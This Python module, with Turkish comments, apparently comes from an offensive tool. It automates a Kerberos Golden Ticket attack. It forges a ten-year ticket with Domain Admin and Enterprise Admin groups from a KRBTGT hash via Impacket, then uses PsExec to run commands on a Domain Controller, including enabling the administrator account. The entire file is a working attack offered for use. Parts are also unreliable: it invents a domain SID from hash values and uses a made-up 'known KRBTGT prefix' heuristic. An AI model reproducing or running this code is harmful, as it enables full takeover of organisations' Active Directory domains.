"""
Golden Ticket Automation Module
KRBTGT hash analizi yaparak otomatik Golden Ticket oluşturur,
PsExec ile Domain Controller'a erişim sağlar ve Domain Admin olunmasını sağlar.
"""
import subprocess
import os
import uuid
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


@dataclass
class GoldenTicketResult:
    """Golden Ticket işlem sonucu"""
    success: bool
    ticket_path: Optional[str] = None
    command: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None
    logs: List[str] = field(default_factory=list)


class GoldenTicketAutomation:
    """Golden Ticket forgeries and executes with Domain Controller"""
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.temp_dir = "/tmp/monolith_golden"
        os.makedirs(self.temp_dir, exist_ok=True)
        self.ticket_path = None
    
    def is_krbtgt_hash(self, hash_str: str) -> bool:
        """
        Hash'in KRBTGT hash olup olmadığını analiz eder.
        
        Args:
            hash_str: Analiz edilecek hash string
            
        Returns:
            bool: KRBTGT hash ise True
        """
        if not hash_str or len(hash_str) < 10:
            return False
            
        hash_lower = hash_str.lower().strip()
        
        # KRBTGT indicator'ları
        krbtgt_indicators = [
            "krbtgt",
            "krb5asrep",
            "krb5tgs",
            "23b6d2b3c5e9f1a4d5c8",  # Bilinen KRBTGT hash prefix
            "aad3b435b51404eeaad3b435b51404ee",  # Empty LM hash ile birlikte
        ]
        
        # NTLM hash format kontrolü (32 karakter veya user:LM:NT formatı)
        has_ntlm_format = (
            len(hash_lower.replace(":", "")) == 32 or  # Sadece NTLM
            (":" in hash_lower and len(hash_lower.split(":")[-1]) == 32)  # user:LM:NT
        )
        
        # Keyword kontrolü
        for indicator in krbtgt_indicators:
            if indicator in hash_lower:
                return True
        
        # Hash format kontrolü (KRBTGT genellikle NTLM formatında)
        # Bilinen KRBTGT NTLM hash pattern'leri
        if has_ntlm_format and ("krb" in hash_lower or hash_lower.count(":") == 2):
            return True
            
        return False
    
    def forge_golden_ticket(
        self,
        hash_str: str,
        domain: str,
        target_dc: str,
        user: str = "administrator",
        sid: Optional[str] = None
    ) -> GoldenTicketResult:
        """
        Golden Ticket oluşturur.
        
        Args:
            hash_str: KRBTGT hash (NTLM format: user:LM:NT veya sadece NT hash)
            domain: Active Directory domain adı (örn: CORP.LOCAL)
            target_dc: Hedef Domain Controller IP/hostname
            user: Ticket içindeki kullanıcı (default: administrator)
            sid: Domain SID (biliniyorsa)
            
        Returns:
            GoldenTicketResult: Ticket oluşturma sonucu
        """
        result = GoldenTicketResult(success=False)
        
        try:
            # Hash formatını düzenle
            hash_clean = hash_str.strip()
            
            if ":" in hash_clean:
                parts = hash_clean.split(":")
                if len(parts) >= 3:
                    # user:LM:NT formatı
                    nt_hash = parts[2]
                elif len(parts) == 2:
                    # LM:NT formatı
                    nt_hash = parts[1]
                else:
                    nt_hash = parts[0]
            else:
                # Sadece NTLM hash
                nt_hash = hash_clean
            
            # SID belirtilmemişse, tahmin et (gerçek kullanımda user'dan alınmalı)
            if not sid:
                # Default SID construction - gerçek ortamda Get-DomainSID ile alınmalı
                # Basit bir placeholder SID
                sid = f"S-1-5-21-{abs(hash(nt_hash[:16])) % 1000000000}-{abs(hash(nt_hash[16:])) % 1000000000}-{abs(hash(domain)) % 1000000000}"
            
            # Ticket dosya adı
            ticket_filename = f"golden_ticket_{uuid.uuid4().hex[:8]}.ccache"
            self.ticket_path = os.path.join(self.temp_dir, ticket_filename)
            
            result.logs.append(f"[+] KRBTGT Hash: {nt_hash[:20]}...")
            result.logs.append(f"[+] Domain: {domain}")
            result.logs.append(f"[+] Domain SID: {sid}")
            result.logs.append(f"[+] User: {user}")
            
            # Impacket ticketer kullanarak Golden Ticket oluştur
            # -groups 512 = Domain Admins
            # -extra-sid 519 = Enterprise Admins
            cmd = [
                "python3", "-m", "impacket.ticketer",
                "-nthash", nt_hash,
                "-domain-sid", sid,
                "-domain", domain,
                "-user", user,
                "-groups", "512",
                "-extra-sid", f"{sid}-519",
                "-duration", "60000",  # 10 yıl (gün olarak)
                self.ticket_path
            ]
            
            result.logs.append(f"$ {' '.join(cmd[:6])} ...")
            result.logs.append("[*] Impacket ticketer çalıştırılıyor...")
            
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if proc.returncode != 0:
                # stderr kontrol et
                stderr = proc.stderr
                result.logs.append(f"[-] Hata: {stderr}")
                
                # Alternatif yöntem: secretsdump style
                result.logs.append("[*] Alternatif yöntem deneniyor...")
                
                alt_cmd = [
                    "ticketer.py",
                    "-nthash", nt_hash,
                    "-domain-sid", sid,
                    "-domain", domain,
                    "-user", user,
                    "-groups", "512",
                    self.ticket_path
                ]
                
                alt_result = subprocess.run(
                    " ".join(alt_cmd),
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                
                if alt_result.returncode != 0:
                    result.error = f"Ticket oluşturulamadı: {stderr}"
                    result.logs.append(f"[-] {result.error}")
                    return result
            
            # Ticket dosyası oluştu mu kontrol et
            if os.path.exists(self.ticket_path):
                result.success = True
                result.ticket_path = self.ticket_path
                result.output = f"Ticket created: {self.ticket_path}"
                result.logs.append(f"[+] Golden Ticket oluşturuldu: {self.ticket_path}")
                result.logs.append(f"[+] Ticket dosya boyutu: {os.path.getsize(self.ticket_path)} bytes")
            else:
                result.error = "Ticket dosyası oluşturulamadı"
                result.logs.append(f"[-] {result.error}")
                
        except subprocess.TimeoutExpired:
            result.error = "Ticket oluşturma timeout oldu (120s)"
            result.logs.append(f"[-] {result.error}")
        except Exception as e:
            result.error = str(e)
            result.logs.append(f"[-] Beklenmeyen hata: {result.error}")
        
        return result
    
    def execute_psexec(
        self,
        target: str,
        ticket_path: str,
        command: str = "whoami"
    ) -> Dict[str, Any]:
        """
        Golden Ticket kullanarak PsExec ile hedefte komut çalıştırır.
        
        Args:
            target: Hedef IP/hostname
            ticket_path: Ticket dosya yolu
            command: Çalıştırılacak komut
            
        Returns:
            Dict: Komut çıktısı
        """
        result = {
            "success": False,
            "output": "",
            "error": "",
            "logs": []
        }
        
        try:
            # KRB5CCNAME ortam değişkeni set et
            env = os.environ.copy()
            env["KRB5CCNAME"] = ticket_path
            env["KRB5_CLIENT_KTNAME"] = ticket_path
            
            result["logs"].append(f"[*] Hedef: {target}")
            result["logs"].append(f"[*] Ticket: {ticket_path}")
            result["logs"].append(f"[*] Komut: {command}")
            
            # Impacket psexec.py veya smbexec.py kullan
            # -k = use Kerberos
            # -no-pass = no password required (using ticket)
            
            cmd = [
                "psexec.py",
                "-k",
                "-no-pass",
                f"administrator@{target}",
                command
            ]
            
            result["logs"].append(f"$ {' '.join(cmd)}")
            result["logs"].append("[*] PsExec çalıştırılıyor (Kerberos ticket ile)...")
            
            proc = subprocess.run(
                " ".join(cmd),
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                env=env
            )
            
            result["output"] = proc.stdout
            result["logs"].append(f"[*] Çıktı:\n{proc.stdout[:500]}")
            
            if proc.returncode != 0:
                result["error"] = proc.stderr
                result["logs"].append(f"[-] Hata: {proc.stderr[:300]}")
            else:
                result["success"] = True
                result["logs"].append("[+] Komut başarıyla çalıştırıldı")
                
        except subprocess.TimeoutExpired:
            result["error"] = "Komut timeout oldu (60s)"
            result["logs"].append(f"[-] {result['error']}")
        except Exception as e:
            result["error"] = str(e)
            result["logs"].append(f"[-] Beklenmeyen hata: {result['error']}")
        
        return result
    
    def get_dc_info(self, target: str, ticket_path: str) -> Dict[str, Any]:
        """
        DC hakkında bilgi toplar (whoami, hostname, ipconfig)
        
        Args:
            target: DC IP/hostname
            ticket_path: Ticket dosya yolu
            
        Returns:
            Dict: Bilgi çıktısı
        """
        info = {}
        
        # whoami
        result = self.execute_psexec(target, ticket_path, "whoami /all")
        info["whoami"] = result["output"]
        
        # hostname
        result = self.execute_psexec(target, ticket_path, "hostname")
        info["hostname"] = result["output"]
        
        # ipconfig
        result = self.execute_psexec(target, ticket_path, "ipconfig /all")
        info["ipconfig"] = result["output"]
        
        return info
    
    def full_domain_admin_attack(
        self,
        krbtgt_hash: str,
        domain: str,
        dc_ip: str,
        domain_sid: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Tam Golden Ticket saldırısı gerçekleştirir.
        
        Args:
            krbtgt_hash: KRBTGT NTLM hash
            domain: Domain adı
            dc_ip: Domain Controller IP
            domain_sid: Domain SID (varsa)
            
        Returns:
            Dict: Saldırı sonucu
        """
        result = {
            "success": False,
            "steps": {
                "is_krbtgt": False,
                "ticket_forged": False,
                "psexec_success": False,
                "domain_admin": False
            },
            "ticket_path": None,
            "logs": [],
            "message": ""
        }
        
        result["logs"].append("=" * 50)
        result["logs"].append("GOLDEN TICKET AUTOMATION - TAM SALDIRI")
        result["logs"].append(f"Başlangıç zamanı: {datetime.now().isoformat()}")
        result["logs"].append("=" * 50)
        
        # === ADIM 1: Hash Analizi ===
        result["logs"].append("")
        result["logs"].append("[ADIM 1] KRBTGT Hash Analizi")
        result["logs"].append("-" * 30)
        
        is_krbtgt = self.is_krbtgt_hash(krbtgt_hash)
        result["steps"]["is_krbtgt"] = is_krbtgt
        
        if not is_krbtgt:
            result["message"] = "Bu hash KRBTGT hash değil"
            result["logs"].append(f"[-] UYARI: {result['message']}")
            result["logs"].append("[*] Hashdump sonuçlarını kontrol edin, KRBTGT hesabını arayın")
            return result
        
        result["logs"].append("[+] KRBTGT hash doğrulandı!")
        result["logs"].append(f"[+] Hash: {krbtgt_hash[:30]}...")
        
        # === ADIM 2: Golden Ticket Oluşturma ===
        result["logs"].append("")
        result["logs"].append("[ADIM 2] Golden Ticket Oluşturma")
        result["logs"].append("-" * 30)
        
        ticket_result = self.forge_golden_ticket(
            hash_str=krbtgt_hash,
            domain=domain,
            target_dc=dc_ip,
            sid=domain_sid
        )
        
        result["logs"].extend(ticket_result.logs)
        
        if not ticket_result.success:
            result["message"] = "Golden Ticket oluşturulamadı"
            result["logs"].append(f"[-] {result['message']}")
            return result
        
        result["steps"]["ticket_forged"] = True
        result["ticket_path"] = ticket_result.ticket_path
        
        # === ADIM 3: DC'ye Erişim (PsExec) ===
        result["logs"].append("")
        result["logs"].append("[ADIM 3] DC'ye Erişim (PsExec)")
        result["logs"].append("-" * 30)
        
        # Önce basit bir komut çalıştır (bağlantı testi)
        test_result = self.execute_psexec(
            target=dc_ip,
            ticket_path=ticket_result.ticket_path,
            command="whoami"
        )
        
        result["logs"].extend(test_result.get("logs", []))
        
        if not test_result["success"]:
            result["message"] = "DC'ye PsExec ile erişilemedi"
            result["logs"].append(f"[-] {result['message']}")
            result["logs"].append(f"[-] Hata: {test_result.get('error', 'Bilinmeyen hata')}")
            return result
        
        result["steps"]["psexec_success"] = True
        result["logs"].append(f"[+] DC'ye PsExec ile başarıyla bağlanıldı!")
        
        # === ADIM 4: Domain Admin Yetkisi Alma ===
        result["logs"].append("")
        result["logs"].append("[ADIM 4] Domain Admin Yetkisi Alma")
        result["logs"].append("-" * 30)
        
        # Komutları sırayla çalıştır
        commands = [
            "whoami",  # Mevcut kullanıcıyı kontrol et
            "hostname",  # DC hostname
            "net user administrator /active:yes",  # Admin hesabını aktif et
            'net localgroup administrators /add',  # Varsayılan grup üyeliği
        ]
        
        all_success = True
        for cmd in commands:
            cmd_result = self.execute_psexec(
                target=dc_ip,
                ticket_path=ticket_result.ticket_path,
                command=cmd
            )
            result["logs"].extend(cmd_result.get("logs", []))
            
            if not cmd_result["success"]:
                all_success = False
                result["logs"].append(f"[-] Komut başarısız: {cmd}")
        
        if all_success:
            result["steps"]["domain_admin"] = True
            result["success"] = True
            result["message"] = "Golden Ticket forged, DC owned!"
            result["logs"].append("")
            result["logs"].append("=" * 50)
            result["logs"].append("[++] OPERASYON BAŞARILI! ++")
            result["logs"].append("[++] Golden Ticket forged, DC owned! ++")
            result["logs"].append("[++] Domain Admin yetkisi elde edildi! ++")
            result["logs"].append("=" * 50)
            result["logs"].append(f"[+] Ticket dosyası: {ticket_result.ticket_path}")
            result["logs"].append(f"[+] DC IP: {dc_ip}")
            result["logs"].append(f"[+] Domain: {domain}")
        else:
            result["message"] = "Domain Admin yetkisi alınamadı"
            result["logs"].append(f"[-] {result['message']}")
        
        return result
